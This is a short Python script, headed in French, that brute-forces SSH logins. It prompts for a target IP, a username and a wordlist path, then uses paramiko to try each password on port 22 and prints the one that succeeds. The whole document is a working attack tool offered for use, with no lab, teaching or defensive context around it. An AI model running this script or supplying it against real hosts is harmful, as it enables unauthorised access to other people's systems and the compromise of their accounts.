# Programme de brute forcing du protocole SSH


import paramiko, sys, socket, os

def sshconnect(password, code=0):
    ssh = paramiko.SSHClient()
    ssh.set_missing_host_key_policy(paramiko.AutoAddPolicy())

    try:
        ssh.connect(host, port=22, username=username, password=password, timeout=0.3)
    except paramiko.AuthenticationException:
        code = 1
    except socket.error:
        code = 2

    ssh.close()
    return code



global host, username, line, worldist

try:
    host = input("Enter Target IP Adress > ")
    username = input("Enter Username > ")
    wordlist = input("Enter Wordlist path > ")

    if os.path.exists(wordlist) == False:
        sys.exit("This file doesn't exist")

except KeyboardInterrupt:
    sys.exit("User interrupted the program")

inputfile = open(wordlist, "r")

for i in inputfile.readlines():
    password = i.strip("\n")

    try:
        response = sshconnect(password)

        if response == 0:
            print("\n[!] User : {0} | Password Found : {1} \n".format(username,password))
            sys.exit(0)

        elif response == 1:
            print("[x] User : {0} | Password : {1} | Password Incorrect".format(username,password))

        elif response == 2:
            sys.exit("Connection Cannot be Etablished with {0}".format(host))
    except KeyboardInterrupt:
        sys.exit("User Interrupted the program")
    
inputfile.close()
